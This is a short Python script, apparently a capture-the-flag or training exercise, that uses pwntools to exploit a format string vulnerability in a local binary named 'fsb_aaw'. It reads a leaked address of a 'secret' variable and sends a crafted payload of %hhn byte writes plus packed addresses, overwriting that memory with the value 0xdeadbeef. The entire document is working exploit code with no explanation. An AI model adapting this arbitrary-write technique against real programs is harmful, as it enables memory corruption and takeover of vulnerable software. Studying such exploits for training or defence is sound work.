#!/usr/bin/python3
# Name: fsb_aaw_deadbeef.py

from pwn import *

p = process("./fsb_aaw")

p.recvuntil(b"`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)

fstring = f"%{0xad}c%16$hhn".encode()
fstring += f"%{0xbe - 0xad}c%15$hhn".encode()
fstring += f"%{0xde - 0xbe}c%17$hhn".encode()
fstring += f"%{0xef - 0xde}c%14$hhn".encode()
fstring = fstring.ljust(64, b'a')
fstring += p64(addr_secret) # %14$n
fstring += p64(addr_secret + 1) # %15$n
fstring += p64(addr_secret + 2) # %16$n
fstring += p64(addr_secret + 3) # %17$n

p.sendline(fstring)
print(p.recvall())